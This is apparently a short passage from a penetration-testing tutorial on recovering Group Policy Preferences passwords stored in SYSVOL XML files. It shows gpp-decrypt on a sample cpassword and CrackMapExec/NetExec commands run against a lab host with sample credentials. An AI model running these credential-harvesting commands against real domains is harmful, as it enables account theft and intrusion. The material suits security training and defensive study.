When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.
#### Viewing Groups.xml
If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:
#### Decrypting the Password with gpp-decrypt
```shell
> gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```
#### Locating & Retrieving GPP Passwords with CrackMapExec
```shell
crackmapexec smb -L | grep gpp
gpp_autologin
gpp_password 
```
#### Using NetExec's gpp_autologin Module
```shell
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```
